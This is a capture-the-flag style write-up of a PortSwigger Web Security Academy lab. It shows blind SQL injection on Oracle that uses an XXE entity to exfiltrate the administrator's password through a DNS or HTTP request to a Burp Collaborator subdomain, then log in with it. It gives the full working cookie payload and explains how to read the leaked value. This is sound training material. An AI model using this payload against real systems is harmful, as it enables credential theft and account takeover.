# Blind SQL Injection with Out-of-Band Data Exfiltration

**Platform:** PortSwigger Web Security Academy

**Difficulty:** Practitioner

**Type:** Blind SQL Injection / OOB Data Exfiltration

**Database:** Oracle

**Status:** Solved



## 🎯 Objective



Exploit the `TrackingId` cookie to retrieve the `administrator` user's password through a **Burp Collaborator 
interaction**, then log in as the administrator.



## 🧠 Core Idea



Unlike the previous OOB lab, we don't just trigger an interaction. We **embed the database value inside the 
Collaborator hostname**.



```text

SQL Injection

     ↓

SELECT administrator password

     ↓

Insert password into hostname

     ↓

DNS/HTTP request to Collaborator
     ↓

Password appears in interaction

     ↓

Login as administrator

```



## 1. Generate a Collaborator Payload



In Burp Collaborator:



**Right-click → Insert Collaborator payload**



This generates a domain such as:



```text

xxxxx.burpcollaborator.net
```



## 2. SQL Injection Payload



```http

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root
+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.
BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

```



Replace:



```text

BURP-COLLABORATOR-SUBDOMAIN

```



with the generated Collaborator payload.


## 3. Payload Breakdown



### Retrieve the password



```sql

SELECT password
FROM users

WHERE username='administrator'

```



This retrieves the administrator's password.



### String concatenation



Oracle uses:



```sql

||

```



to concatenate strings.



Conceptually:



```text

http://

+

administrator_password

+

.COLLABORATOR-DOMAIN

```



becomes:



```text

http://PASSWORD.COLLABORATOR-DOMAIN/

```



### XXE / External Entity



The XML contains an external entity pointing to the generated Collaborator domain.



When Oracle processes the XML, it makes an external request.



## 4. Send the Request



Send the modified request from **Burp Repeater**.



The SQL query runs asynchronously, so the HTTP response itself does not reveal the password.



## 5. Retrieve the Password



Open the **Collaborator** tab and click:



**Poll now**



If no interaction appears immediately, wait a few seconds and poll again.



### DNS Interaction



Check the **Description** tab.



The full domain should contain:



```text

PASSWORD.xxxxx.burpcollaborator.net

```


The first part is the administrator password.



### HTTP Interaction



Check:



**Request to Collaborator**



Look at:



```http

Host: PASSWORD.xxxxx.burpcollaborator.net

```



Again, the first part contains the password.



## 6. Login



Go to:



**My account**




Use:



```text

Username: administrator

Password: <leaked password>

```




The lab should be solved after successful login.


## 🔑 Key Takeaways



```text

OOB SQL Injection

       ↓

Extract database value

       ↓

Concatenate value into external domain

       ↓

Collaborator receives DNS/HTTP interaction

       ↓

Read leaked value

```



### Important Oracle Functions



```sql

EXTRACTVALUE()

XMLTYPE()

||

```


### Difference from the Previous OOB Lab



| Lab                   | Goal                                          |
| --------------------- | --------------------------------------------- |
| OOB Interaction       | Trigger a DNS lookup                          |
| OOB Data Exfiltration | Trigger a lookup **containing database data** |





> **Key concept:** OOB data exfiltration allows sensitive database values to be transferred through an external interaction when the application's normal response provides no useful information.



### References



* [PortSwigger — Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration?utm_source=chatgpt.com)
* [PortSwigger — SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet?utm_source=chatgpt.com)
